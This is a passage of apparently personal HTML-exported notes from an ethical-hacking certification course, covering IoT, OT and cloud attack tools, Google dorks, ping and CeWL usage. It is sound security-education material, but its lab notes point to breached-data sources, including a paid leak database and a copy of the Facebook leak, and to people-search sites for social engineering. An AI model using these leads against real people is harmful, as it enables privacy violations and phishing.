id="eba5bf0c-01e8-48b2-89a8-5186cfad217d" class="bulleted-list"><li style="list-style-type:circle">but there are powerfull rf antennas that can get near and sniff that signal and then wirelessly repeat that near the car to open</li></ul></li></ul><ul id="731c975c-9bfa-4240-b9aa-a94b897eb64b" class="bulleted-list"><li style="list-style-type:disc">BusPirate , the Shikra<ul id="89f9b39f-476c-4a20-8706-dfe0c4ed9a51" class="bulleted-list"><li style="list-style-type:circle">a tool that can be attach to a serial interface of pc devices</li></ul></li></ul><ul id="66634f71-5e7f-4c92-9586-b2e0c93e9d1d" class="bulleted-list"><li style="list-style-type:disc">NAND Glitching<ul id="105b64c3-5b6d-4593-af0c-b202195a1231" class="bulleted-list"><li style="list-style-type:circle">attaching to the chip memory </li></ul></li></ul><ul id="0c05c987-29a0-411e-becf-fe184f512853" class="bulleted-list"><li style="list-style-type:disc">SOIC Klip<ul id="39ec25d9-c48d-4129-89ca-55977c4b10c8" class="bulleted-list"><li style="list-style-type:circle">used in combination to the others, it attaches to the chip in the motherboard likea clip</li></ul></li></ul><ul id="3eaaf5ab-7be4-42e6-89a1-72b4799584d1" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="1b2238ae-328e-4b15-a51e-2f6337e70447" class="">
</p><h3 id="e8b80f7f-6742-41ad-8a09-095dd0264352" class="">Explain IoT Hacking Methodology</h3><p id="4095f052-78ee-438e-8654-ae1afd2a619c" class="">
</p><h3 id="142a5ec5-6bdb-459b-9d9d-10ad7e70a127" class="">Explain IoT Attack Countermeasures</h3><ul id="c0dcb833-91eb-458f-8843-74b3a2379d2c" class="bulleted-list"><li style="list-style-type:disc">build them on auzre iot architecture, its safer</li></ul><ul id="7b35b467-a3c2-42af-8ba2-b639ac9b0b79" class="bulleted-list"><li style="list-style-type:disc">never use self signed certificates, try to use ssh</li></ul><ul id="c11a8a0a-beba-4625-8adc-44461e89bc6d" class="toggle"><li><details open=""><summary>Defending</summary><figure id="c53bf949-f3fe-4cb7-91e5-3662043853dd" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2083.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2083.png"/></a></figure></details></li></ul><ul id="b47b877a-8b98-49fd-8344-57111a784ae6" class="toggle"><li><details open=""><summary>Vulnerability solutions</summary><figure id="90b8bf35-7d4c-4790-ad74-83d9e5a824cb" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2084.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2084.png"/></a></figure></details></li></ul><h3 id="eed29502-6657-4f6b-9405-4e3319f7d30b" class="">Summarize OT Concepts</h3><ul id="1d30ded7-99dc-4692-9b8a-02a4e15ae6aa" class="bulleted-list"><li style="list-style-type:disc">operation technology, they dont have information, its just operations</li></ul><ul id="af4c2568-351c-4acb-9808-1501d1cf17d5" class="toggle"><li><details open=""><summary>Purdue model, in the exam</summary><ul id="f7051944-3049-49e8-83a4-3fc0c626a7dc" class="bulleted-list"><li style="list-style-type:disc">hierarchy of use</li></ul><figure id="f5d7c5bc-6e3c-4458-8021-9aa542c37059" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2085.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2085.png"/></a></figure></details></li></ul><ul id="8d725860-2958-4e7e-9c9e-4cd8aecde7b8" class="bulleted-list"><li style="list-style-type:disc">DNP3 and MODBUS are common in OT technology<ul id="a8931802-8ccb-41cd-ad34-3bcee8789737" class="bulleted-list"><li style="list-style-type:circle">in the exam</li></ul></li></ul><h3 id="03ee2ffd-f890-416a-817d-e8b5fcda044a" class="">Explain OT Attacks</h3><ul id="c55475e6-a356-4b2a-ba7d-95bc57e4aab8" class="bulleted-list"><li style="list-style-type:disc">OT systems are exposed in shodan</li></ul><ul id="2af94b4c-694b-4ba0-a352-db92b263a7a9" class="bulleted-list"><li style="list-style-type:disc">MITRE for OC Systems</li></ul><ul id="92f0dd5f-aa80-43d4-aa78-ba78e27d2fdd" class="bulleted-list"><li style="list-style-type:disc">Hacking PLC<ul id="d6c6093e-e2e4-48cc-9037-ad48c6209baf" class="bulleted-list"><li style="list-style-type:circle">small computer, has its own programmign language</li></ul><ul id="1a9ab72d-85e6-43d5-a522-545dbf13390e" class="bulleted-list"><li style="list-style-type:circle">most of the time they pucrhase it for knowing how to hack it</li></ul><ul id="957e0f74-22e3-4abd-8505-0a064704c4c1" class="bulleted-list"><li style="list-style-type:circle">most of the time its sold as blackbox so that no one know whats inside so that its more difficult to hack it</li></ul></li></ul><h3 id="410bba2a-037b-41d2-8482-0fcfb14a1da4" class="">Explain OT Hacking Methodology</h3><ul id="a31ef982-32e7-404d-bba7-13bfa3ff6f23" class="bulleted-list"><li style="list-style-type:disc">Skybox vulnerability scanners</li></ul><ul id="f743dc0b-8a8e-401e-a584-0500890b0ca4" class="bulleted-list"><li style="list-style-type:disc">Fuzzing ICS Protocols</li></ul><p id="6ba3857f-57ae-4a1c-8471-541d5b946609" class="">
</p><h3 id="b5b53683-f389-4ba4-8426-51509100880e" class="">Explain OT Attack Countermeasures</h3><p id="b0be98aa-f5ad-4f7e-927e-8e5f1126a89d" class=""><br/><br/></p></details></li></ul><ul id="6c292a9c-78bb-4d56-a71f-a2b45b991700" class="toggle"><li><details open=""><summary>Module 19 - Cloud Computing</summary><h3 id="cfb91e8d-69d2-4caa-8179-e673d88e3e79" class="">Concepts</h3><ul id="8ca15155-cd50-4d5c-9787-ce7fd57669c8" class="toggle"><li><details open=""><summary>Types of cloud computing services</summary><figure id="e0f0c401-d861-4d8d-9e86-7d13a568314b" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2086.png"><img style="width:807.6135864257812px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2086.png"/></a></figure></details></li></ul><ul id="11bec658-6b36-4c7c-b450-2120da6ad7b3" class="toggle"><li><details open=""><summary>NIDS Cloud Dployment Roles in the exam</summary><figure id="fb47e2b7-3e90-4f1a-983d-465d45bd20a2" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2087.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2087.png"/></a></figure></details></li></ul><ul id="ed6c931a-4f4f-43b5-9e78-9d0070a22d2b" class="bulleted-list"><li style="list-style-type:disc">Containers - Docker</li></ul><ul id="8d959413-fd38-4f8e-bdb5-ae463af31f4e" class="bulleted-list"><li style="list-style-type:disc">Microservices<ul id="7b257cf5-e823-4edf-9d27-5970874586e0" class="bulleted-list"><li style="list-style-type:circle">used instead of having a vm to run services because it takes resources</li></ul><ul id="0ef169cb-28e3-40de-b8f5-41617244ca06" class="bulleted-list"><li style="list-style-type:circle">these take only the resources of the service</li></ul></li></ul><ul id="361873f7-6cbe-4f74-bd0b-0cc48d50d9c7" class="toggle"><li><details open=""><summary>Container Security Issues</summary><figure id="f2f38a18-e52d-4294-8dd5-215f635497af" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2088.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2088.png"/></a></figure></details></li></ul><p id="649957c0-f7d0-4273-bb8f-c8624897b876" class="">
</p><ul id="92e963ff-f470-43c3-a5eb-2aa424b52bc5" class="bulleted-list"><li style="list-style-type:disc">Serverless Computing</li></ul><ul id="fac7a50b-2e96-48bd-8099-88c57691bb0e" class="bulleted-list"><li style="list-style-type:disc">Trivy to find vulns in containers</li></ul><ul id="bcce65b9-6afd-4ad0-8e18-9d80ad94d7f2" class="bulleted-list"><li style="list-style-type:disc">Enumerating S3 Buckets<ul id="74068c30-4249-45bb-88bb-dd81cf85bd30" class="bulleted-list"><li style="list-style-type:circle">they are part of aws cloud</li></ul><ul id="ac14ceac-1134-4cf7-bd72-435356a79f7a" class="bulleted-list"><li style="list-style-type:circle">they are like small size memory sticks which hold data and have access control</li></ul><ul id="18119b2f-36c9-4f62-b7e6-13a4c197cf0f" class="bulleted-list"><li style="list-style-type:circle">if they have improper access control you can</li></ul><ul id="8e3d7a0d-ba43-48ec-b7c3-c6d8e8697cf6" class="bulleted-list"><li style="list-style-type:circle">but they can be enumerated only by aws users so you need an account to do that</li></ul><ul id="4845bb4c-cbbf-4a6f-a729-d78bbcd70469" class="bulleted-list"><li style="list-style-type:circle">most of the times people that build aws infastructure are not security people they want to just make them work</li></ul><ul id="0eab5514-5786-4b4b-b2de-a1f2b689c4d1" class="bulleted-list"><li style="list-style-type:circle">Tool: S3 Inspector (needs aws account)</li></ul></li></ul><ul id="1429f409-90fd-4598-90b6-5ef625594e03" class="bulleted-list"><li style="list-style-type:disc">Enumerate Azure Active Directory Accounts<ul id="36b63b4e-374c-4f27-b99d-9433ecc4c603" class="bulleted-list"><li style="list-style-type:circle">Tool: <ul id="622b59af-aa3e-46cc-baed-74feb9a741ba" class="bulleted-list"><li style="list-style-type:square">Azucar (github)</li></ul><ul id="0ebe14b7-7e26-4bc3-9346-d10ed8ea0ff6" class="bulleted-list"><li style="list-style-type:square">ruler (github): can discover valid usernames with bruteforce</li></ul></li></ul></li></ul><ul id="47b37bbb-3951-4628-a231-bffd72594375" class="bulleted-list"><li style="list-style-type:disc">Tool: Nimbostratus</li></ul><ul id="454c02d2-dc95-47f6-8a84-f6b603abeba8" class="bulleted-list"><li style="list-style-type:disc">Hijacking Misconfigured LAM - Pacu</li></ul><ul id="7049cfd1-3506-4808-83ad-87fd2f2fb904" class="bulleted-list"><li style="list-style-type:disc">Cloud Container Attack Tool</li></ul><ul id="1ca59b3d-91e1-41c2-89c5-de5a5958b338" class="bulleted-list"><li style="list-style-type:disc">Serverless-Based Attacks on AWS Lamda</li></ul><ul id="12929aad-5124-4cca-b470-c3e091a04412" class="bulleted-list"><li style="list-style-type:disc">Dosckerscan</li></ul><ul id="52a4f980-14d4-4662-969d-558438f9747e" class="bulleted-list"><li style="list-style-type:disc">AWS pwn</li></ul><p id="f36eb3fc-0463-4362-968d-ab87c13b0187" class="">
</p><h3 id="28944918-0d62-42ac-89b6-c63d3e9ef8d4" class="">Cloud Security Controls</h3><p id="bb5bc851-4e20-4cb1-afb6-e5b6e345b786" class="">
</p></details></li></ul><ul id="ef220fb0-460b-4092-93a2-41592f921306" class="toggle"><li><details open=""><summary>Module 20 - Cryptography</summary><ul id="cfe60077-b72b-4044-ac49-dcc6f9e9c5b9" class="bulleted-list"><li style="list-style-type:disc">GAK - Government Access to Keys<ul id="3f5d8fbe-1afd-431f-b2ec-541f821d472e" class="bulleted-list"><li style="list-style-type:circle">Governments have master keys for software so that if they have someone at target they can unlock the encryption</li></ul></li></ul><ul id="958bc437-76c3-4847-b913-b9b6520828a4" class="bulleted-list"><li style="list-style-type:disc">Rubber Hose Attack<ul id="1605f937-1f71-4dc1-8b58-839c45bdf1d0" class="bulleted-list"><li style="list-style-type:circle">is the most powerful cryptology attack</li></ul></li></ul></details></li></ul><ul id="431dac8a-97e9-41da-b38e-a19b36ec8188" class="toggle"><li><details open=""><summary>Exam Information</summary><ul id="2b3e33c6-0157-40a8-8bb6-4bbda78dd542" class="bulleted-list"><li style="list-style-type:disc">we will schedule one more session online to pass again through the material</li></ul><ul id="82b52ce1-9cfc-47aa-a317-f121b1ec29a4" class="bulleted-list"><li style="list-style-type:disc">make the ceh assesment in ec council<ul id="609730e2-3c88-4973-ade0-09b45b3e4fcc" class="bulleted-list"><li style="list-style-type:circle">fill in fake info</li></ul></li></ul><ul id="68641b18-d466-4be7-b91a-92445902460d" class="bulleted-list"><li style="list-style-type:disc"></li></ul></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Lab Notes</summary><div class="indented"><ul id="07929128-84ec-4005-b53d-7f1c0d4c1847" class="toggle"><li><details open=""><summary>Lab 1 - Footprinting and Reconnaisance</summary><ul id="ebdd90d0-d6a7-4c38-ae63-583bfa6e4917" class="toggle"><li><details open=""><summary>Info Gathering</summary><p id="3ca585fe-1f66-4ec2-bf40-195af75d9a9a" class="">In this stage, we gather as much info as we can about the people and available targets (servers)</p><ul id="065d6a9a-60a6-4ca5-b738-7c5b4c3ac457" class="toggle"><li><details open=""><summary>Google Hacking</summary><ul id="a3aca09d-d2c1-4804-aa1a-ffd96e278511" class="bulleted-list"><li style="list-style-type:disc">intitle:login site:eccouncil.org</li></ul><ul id="b9cd1490-9547-46d4-b8dc-549931500ed3" class="bulleted-list"><li style="list-style-type:disc">filetype:pdf</li></ul><ul id="cbfba8f7-59f5-4786-b40c-1c48711b57b7" class="toggle"><li><details open=""><summary>Others</summary><ul id="65fc8e50-e023-4668-8a29-7a704b4f0e76" class="bulleted-list"><li style="list-style-type:disc"><strong>cache</strong>: This operator allows you to view cached version of the web page. [cache:www.eccouncil.org]- Query returns the cached version of the website www.eccouncil.org</li></ul><ul id="337f88c9-1173-40bb-a74e-9c4d456a6d77" class="bulleted-list"><li style="list-style-type:disc"><strong>allinurl</strong>: This operator restricts results to pages containing all the query terms specified in the URL. [allinurl: EC-Council career]—Query returns only pages containing the words “EC-Council” and “career” in the URL</li></ul><ul id="84e046bc-61d1-4ed7-ac50-8280bb48100a" class="bulleted-list"><li style="list-style-type:disc"><strong>inurl</strong>: This operator restricts the results to pages containing the word specified in the URL [inurl: copy site:www.eccouncil.org]—Query returns only pages in EC-Council site in which the URL has the word “copy”</li></ul><ul id="6fdc8f3e-69b4-4dc8-9b49-05bba9f45e73" class="bulleted-list"><li style="list-style-type:disc"><strong>allintitle</strong>: This operator restricts results to pages containing all the query terms specified in the title. [allintitle: detect malware]—Query returns only pages containing the words “detect” and “malware” in the title</li></ul><ul id="f0f6f6c1-9a73-45db-beba-75d6d3442627" class="bulleted-list"><li style="list-style-type:disc"><strong>inanchor</strong>: This operator restricts results to pages containing the query terms specified in the anchor text on links to the page. [Anti-virus inanchor:Norton]—Query returns only pages with anchor text on links to the pages containing the word “Norton” and the page containing the word “Anti-virus”</li></ul><ul id="380bef11-f39e-4bca-af42-28cb919d7d6d" class="bulleted-list"><li style="list-style-type:disc"><strong>allinanchor</strong>: This operator restricts results to pages containing all query terms specified in the anchor text on links to the page. [allinanchor: best cloud service provider]—Query returns only pages in which the anchor text on links to the pages contain the words “best,” “cloud,” “service,” and “provider”</li></ul><ul id="dfdf23ce-ad18-436d-aa7c-fd197941d401" class="bulleted-list"><li style="list-style-type:disc"><strong>link</strong>: This operator searches websites or pages that contain links to the specified website or page. [link:www.eccouncil.org]—Finds pages that point to EC-Council’s home page</li></ul><ul id="5df74296-f08e-43f0-8b2a-f65afed45e1d" class="bulleted-list"><li style="list-style-type:disc"><strong>related</strong>: This operator displays websites that are similar or related to the URL specified. [related:www.eccouncil.org]—Query provides the Google search engine results page with websites similar to eccouncil.org</li></ul><ul id="4e0ea8b5-d644-466a-ad79-5dcba9d5052a" class="bulleted-list"><li style="list-style-type:disc"><strong>info</strong>: This operator finds information for the specified web page. [info:eccouncil.org]—Query provides information about the www.eccouncil.org home page</li></ul><ul id="ee3edaf2-89e7-46f5-bddf-a0ebb58b5b27" class="bulleted-list"><li style="list-style-type:disc"><strong>location</strong>: This operator finds information for a specific location. [location: EC-Council]—Query give you results based around the term EC-Council</li></ul></details></li></ul></details></li></ul><ul id="6e3b80c1-49ce-4821-b6e5-c615f41b49d8" class="toggle"><li><details open=""><summary>Youtube</summary><ul id="e4bfd08b-fcf8-4521-921c-0b6fa45e4ecb" class="bulleted-list"><li style="list-style-type:disc">https://mattw.io/youtube-metadata<ul id="226f4bd6-93bf-447b-9878-db20d4767414" class="bulleted-list"><li style="list-style-type:circle">Details about youtube video</li></ul><ul id="d9a2dffb-d80a-4785-a2bf-5357fc124446" class="bulleted-list"><li style="list-style-type:circle">published date time, tags, thumbnail, geolocation</li></ul><ul id="72dba9ee-6b1a-4784-9eb6-cf89af253c8d" class="bulleted-list"><li style="list-style-type:circle">exact view, exact subscribers</li></ul></li></ul></details></li></ul><ul id="4cbd2ef7-ceb8-403f-828d-9c82509821f9" class="toggle"><li><details open=""><summary>FTP Search Engines</summary><ul id="c4730e44-4e16-4b3a-be00-12ccd65c5d5f" class="bulleted-list"><li style="list-style-type:disc">they search for files in ftp servers online</li></ul><ul id="ebc889f8-d33f-4990-93cc-efe675b74340" class="bulleted-list"><li style="list-style-type:disc">searchftps.net, frewareweb.com</li></ul></details></li></ul><ul id="237dc238-2915-4989-80ab-e09b3353a8e7" class="toggle"><li><details open=""><summary>IoT Search Engines</summary><ul id="d8673f11-9d87-424f-ab0b-528c5b76e3d6" class="bulleted-list"><li style="list-style-type:disc">shodan.io</li></ul><ul id="d4a10dee-e2e2-4f85-9d1b-cc84a4515d0f" class="bulleted-list"><li style="list-style-type:disc">censys.io</li></ul></details></li></ul><ul id="2d699407-09aa-4f15-bf9a-0751a72ac0e5" class="toggle"><li><details open=""><summary>Netcraft for finding sub-domains</summary><ul id="70cac950-5406-47b8-9dce-70f08f8368fe" class="bulleted-list"><li style="list-style-type:disc">https://sitereport.netcraft.com<ul id="6ee2c4ce-fe97-4f27-b891-f47b99a0a685" class="bulleted-list"><li style="list-style-type:circle">click on domain after searching, to find sub-domains</li></ul></li></ul><ul id="2e9af6cc-8827-4cc8-a389-4bddde9b521a" class="bulleted-list"><li style="list-style-type:disc">A company&#x27;s top-level domains (TLDs) and sub-domains can provide much useful information such as organizational history, services and products, and contact information.</li></ul><ul id="e546f4e3-bc6f-4eb1-a5f3-06915b4511fe" class="bulleted-list"><li style="list-style-type:disc">Other Tools: sublist3r, pentest-tools.com</li></ul></details></li></ul><ul id="520ddfc0-eef2-449e-a4dd-28912a35dcbc" class="toggle"><li><details open=""><summary>PeekYou People Search</summary><ul id="a5be9c8e-6f5e-496c-bc98-cec448039354" class="bulleted-list"><li style="list-style-type:disc">to gather personal information on people (only in the US)</li></ul><ul id="c7794b9d-e145-450a-aad9-0a69d83ae2e8" class="bulleted-list"><li style="list-style-type:disc">The result shows information such as public records, background details, email addresses, contact information, address history, etc. </li></ul><ul id="10e07810-3a7f-4c0d-8672-3bcfa7cfca16" class="bulleted-list"><li style="list-style-type:disc">This information helps attackers to perform phishing, social engineering, and other types of attacks.</li></ul><ul id="05e1ba68-0ffa-48b2-9c69-af722acf304b" class="bulleted-list"><li style="list-style-type:disc">peekyou.com</li></ul><ul id="092b30f3-b55d-4714-9e87-5644408b08ac" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Spokeo.com, pipl.com, Intelius.com, BeenVerified.com</li></ul></details></li></ul><ul id="c070b88d-9169-4126-a8ea-e1d3886131e0" class="toggle"><li><details open=""><summary>theHarvester</summary><ul id="6ad6c25a-7104-4b3a-9ca4-7c567728935a" class="bulleted-list"><li style="list-style-type:disc"> Intended to help understand the organization’s footprint on the Internet.</li></ul><ul id="5f3b7003-dccb-4788-924a-561bc9a19fa9" class="bulleted-list"><li style="list-style-type:disc">kali tool</li></ul><ul id="d038ea75-c95e-4972-9b53-7acfd00cd9c8" class="bulleted-list"><li style="list-style-type:disc">Doesn’t always work</li></ul></details></li></ul><ul id="a7a312a0-0e51-4595-a586-d7b0913cc847" class="toggle"><li><details open=""><summary>Deep and Dark Web Searching</summary><ul id="38689570-6258-4942-8c40-8314932daf05" class="bulleted-list"><li style="list-style-type:disc">No valid example was given here</li></ul><ul id="d450defc-6361-4816-ae8f-0098b01e37b3" class="bulleted-list"><li style="list-style-type:disc">Maybe use it to find password leaks or exploits</li></ul><ul id="5cd671c6-c47e-401b-8f2c-a70be04b71b7" class="bulleted-list"><li style="list-style-type:disc">Useful Sites: The Hidden Wiki, FakeID, Carshop, ExoneraTor, OnionLand Search Engine</li></ul><ul id="9d0f2437-a814-44fe-970e-d42abcf48a04" class="bulleted-list"><li style="list-style-type:disc">Leak Sited<ul id="33af7c44-a1fb-40b2-86cf-e3b70da7541b" class="bulleted-list"><li style="list-style-type:circle">found by searching reddit for known leak sites download</li></ul><ul id="6a5cbf80-8e47-40b5-b3a9-c46feabf33dc" class="bulleted-list"><li style="list-style-type:circle">leakfindr onion site is interesting<ul id="43c60701-e0bd-43f6-aac3-9a92abbef7d1" class="bulleted-list"><li style="list-style-type:square">you input an email address and finds leaks</li></ul></li></ul><ul id="b53cae37-036d-460e-acb5-903ac91af569" class="bulleted-list"><li style="list-style-type:circle"><a href="https://snusbase.com/purchase">https://snusbase.com</a><ul id="3c93e14c-ea68-45ad-b85f-a7462a37d0b3" class="bulleted-list"><li style="list-style-type:square">with 7$ in bitcoin you can access every database</li></ul></li></ul><ul id="acd0accc-4a52-48dc-a0af-b104ea32ddd5" class="bulleted-list"><li style="list-style-type:circle"><a href="https://github.com/davidfegyver/facebook-533m">https://github.com/davidfegyver/facebook-533m</a><ul id="fb08edd0-5963-4ca1-bb7e-139abda98d70" class="bulleted-list"><li style="list-style-type:square">facebook biggest leak</li></ul></li></ul><ul id="6073d3e2-0a08-4284-bc47-7b62108f5a7c" class="bulleted-list"><li style="list-style-type:circle"><a href="https://intelx.io/">https://intelx.io/</a></li></ul><ul id="1dc0398b-9135-4a73-9504-36fbcd64ebd3" class="bulleted-list"><li style="list-style-type:circle">haveibeenpwned<ul id="e8451abd-80f3-40ef-90cc-7aaba37b2ecf" class="bulleted-list"><li style="list-style-type:square">find latest leaks and then search for them</li></ul></li></ul></li></ul></details></li></ul><ul id="eed997a4-5bbe-45f3-b898-f07e9a26732a" class="toggle"><li><details open=""><summary>Determine Target OS (Passive)</summary><ul id="b45ef314-b110-43d1-87a1-c71e89d888bf" class="bulleted-list"><li style="list-style-type:disc">use search.censys.io<ul id="e3271551-68d1-47eb-8930-419231ba0d40" class="bulleted-list"><li style="list-style-type:circle">Very powerful for initial scanning instead of nmap</li></ul><ul id="15c4fff4-a936-4c81-8417-6049a6709996" class="bulleted-list"><li style="list-style-type:circle">shows open ports and OS</li></ul><ul id="ff0f9656-5d01-4427-8c0c-4d03429f4599" class="bulleted-list"><li style="list-style-type:circle">can find any device for remote access, location open port etc just like shodan</li></ul><ul id="4c1b79ba-cdc5-451a-be3c-58b4d4000697" class="bulleted-list"><li style="list-style-type:circle">shows interesting open ports for cyprus devices</li></ul></li></ul><ul id="8d3567e4-c76a-41be-b630-e35fc624d121" class="bulleted-list"><li style="list-style-type:disc">Others: Netcraft, Shodan</li></ul></details></li></ul><ul id="a8ff3f5f-a65c-4c14-9743-d6c2b16d3893" class="toggle"><li><details open=""><summary>Sherlock</summary><ul id="d9ede5a8-c9f5-43df-86ad-fbfef6d434b0" class="bulleted-list"><li style="list-style-type:disc">searches urls relted to input (eg. usernames) </li></ul><ul id="4ab145ad-cf0e-4ad5-bbd3-02827b043d9b" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Social-Searcher.com, UserRecon on github</li></ul><ul id="c0c9297c-6ae4-4a2f-8826-b2f28fbe0743" class="bulleted-list"><li style="list-style-type:disc">DOESNT WORK</li></ul><p id="e38367ff-b05a-4844-9856-832a12e9c042" class="">
</p></details></li></ul><ul id="874e4c78-270c-40e4-b312-f541011c89be" class="toggle"><li><details open=""><summary>Use of ping</summary><ul id="c868b950-891d-4caa-9e5c-104d56b94844" class="bulleted-list"><li style="list-style-type:disc">use ping &lt;site&gt; -f -l &lt;size&gt;<ul id="64fe02c4-9a65-41e0-b0e3-9d675d48786d" class="bulleted-list"><li style="list-style-type:circle">disables fragmentation</li></ul><ul id="0e35f49e-65b1-4877-9a4c-c09db23556c5" class="bulleted-list"><li style="list-style-type:circle">sets packet size</li></ul><ul id="4b48b70c-7316-4802-9f71-d70188871e79" class="bulleted-list"><li style="list-style-type:circle">can be used to identify the maximum accepted packet size</li></ul><ul id="2c0e50d6-cdfa-4a0e-8a34-efa28cd087fd" class="bulleted-list"><li style="list-style-type:circle">useful for ddos attacks</li></ul></li></ul><ul id="54358d81-d660-48c1-bb24-88685c28a0e9" class="bulleted-list"><li style="list-style-type:disc">use ping &lt;site&gt; -i &lt;no&gt;<ul id="c6b17316-fea2-487d-b085-878f93484c5b" class="bulleted-list"><li style="list-style-type:circle">to set the ttl so that you identify the hops</li></ul><ul id="62031b04-0e0f-4c2d-a62e-b15f321992cb" class="bulleted-list"><li style="list-style-type:circle">it responds with a reply from the last hop that its expired</li></ul></li></ul><ul id="99824ed6-4b69-4de3-b5df-41c544b54999" class="bulleted-list"><li style="list-style-type:disc">use  ping &lt;site&gt; -i &lt;no&gt; -n 1<ul id="90f84aa9-3365-45e9-adce-f8c230780938" class="bulleted-list"><li style="list-style-type:circle">test the connection by incrementing the number</li></ul><ul id="0e10a795-b129-4998-b36c-48a90b9fd528" class="bulleted-list"><li style="list-style-type:circle">used as a tracert untill destination is reached to identify the hops</li></ul><ul id="74ea5f00-ca56-4a57-9f5e-b8c29359760a" class="bulleted-list"><li style="list-style-type:circle">-n 1 is the number of puckets</li></ul></li></ul></details></li></ul><ul id="c4748c54-6854-4bec-91af-76ad91c4d09c" class="toggle"><li><details open=""><summary>Use Photon</summary><ul id="4b4f9de1-c79b-4635-a0e9-f0b76eb0a81f" class="bulleted-list"><li style="list-style-type:disc">Finds urls in a website, crawler</li></ul><ul id="1f569d7b-396c-4199-b0f0-19b3f5bf85bf" class="bulleted-list"><li style="list-style-type:disc">finds internal, external and script urls</li></ul><p id="43f489a9-b995-4765-9e6f-092b575bfa99" class="">
</p><p id="97857aaa-86e5-4ca0-9af5-f2094f81be8f" class="">
</p></details></li></ul><ul id="520abcef-1cb7-4c16-bf19-47c9e7a23835" class="toggle"><li><details open=""><summary>CentralOps</summary><ul id="dbbfccf4-c57e-49ad-b276-52b7b1dc9c35" class="bulleted-list"><li style="list-style-type:disc">centralops.net</li></ul><ul id="fc779ab8-4c58-47bc-ad4f-282543f17a1d" class="bulleted-list"><li style="list-style-type:disc">to gather info about a target website</li></ul><ul id="8dcab8f1-5c03-4ce8-be70-4a0ffc0bbdf3" class="bulleted-list"><li style="list-style-type:disc">its a network scanner for ip, dns, traceroute, nslookup, whois etc</li></ul><ul id="717e14d2-e854-4165-985d-9ed4df3a770a" class="bulleted-list"><li style="list-style-type:disc">these info can be used to find people for social engineering</li></ul><ul id="b44748ed-4a2b-4977-8ee2-a54e84f03ee4" class="bulleted-list"><li style="list-style-type:disc">can also be used to identify other servers such as mail, domain, other subnets etc for attacking</li></ul><ul id="515e71a5-1e28-4820-84e1-c43bbfc3e06b" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Website.informer.com, Burp Suite, Zaproxy</li></ul></details></li></ul><ul id="cea90281-fba4-4d1c-a2aa-445007c51c40" class="toggle"><li><details open=""><summary>WebDataExtractor Pro 4.1</summary><ul id="18f2399c-1e1b-417b-9803-9a13baa453dc" class="bulleted-list"><li style="list-style-type:disc">In <strong>E:\CEH-Tools\CEHv12 Module 02 Footprinting and Reconnaissance\Web Spiders\Web Data Extractor</strong></li></ul><ul id="786082c3-cb2f-48a7-9ec8-093e41f8095a" class="bulleted-list"><li style="list-style-type:disc">The cool thing is that it automates finding emails and phones</li></ul><ul id="2ddd0090-ac4d-4e91-bbf5-75716f94b0a6" class="bulleted-list"><li style="list-style-type:disc">it can also crawl the website</li></ul><ul id="12a56634-cab5-4204-a966-84f6b792318c" class="bulleted-list"><li style="list-style-type:disc">Other Tools: parsehub.com</li></ul><p id="7c71b565-1672-4c98-b90f-9649193ba8ff" class="">
</p></details></li></ul><ul id="5244efa5-c7c0-4bca-bda0-5256ed92ad37" class="toggle"><li><details open=""><summary>HTTrack Web Site Copier</summary><ul id="12ffbd4a-2877-4103-8344-85ab1a68b6ff" class="bulleted-list"><li style="list-style-type:disc">copies websites for local use in the pentest</li></ul><ul id="867d09aa-8f34-41ec-a051-2d60b696f0fd" class="bulleted-list"><li style="list-style-type:disc">so that you dont browse it and trigger alerts</li></ul><ul id="bceec20b-3cda-443f-ad97-434c2432b3cb" class="bulleted-list"><li style="list-style-type:disc">but copying it will trigger alerts</li></ul><ul id="da4bc3f6-11e9-45ae-bc28-d943e60bcf31" class="bulleted-list"><li style="list-style-type:disc">Other Tools: Cyotek WebCopy cyotek.com</li></ul></details></li></ul><ul id="0df2c778-73b6-4d7e-bfb9-2377d65154b2" class="toggle"><li><details open=""><summary>GRecon Tool</summary><ul id="e4ec4f0d-a2b0-4a69-82d8-a7455bcadc6f" class="bulleted-list"><li style="list-style-type:disc">gathering informatrion about a website</li></ul><ul id="3ab92b78-485f-4978-b02f-dcbcde8999ff" class="bulleted-list"><li style="list-style-type:disc">searches for subdomains, dir listing, signup/login pages, exposed docs, worpress entries , pasting sites etc.</li></ul></details></li></ul><ul id="eaf0929e-7ae8-427b-9500-2ed4a3788e98" class="toggle"><li><details open=""><summary>CeWL - wordlist from website</summary><ul id="396ec83c-e4af-4d7e-b075-2c8c0a273273" class="bulleted-list"><li style="list-style-type:disc">cewl -d  2 -m 5 &lt;site&gt;</li></ul><ul id="231583ab-7556-47e2-a09c-13bde1e46c6f" 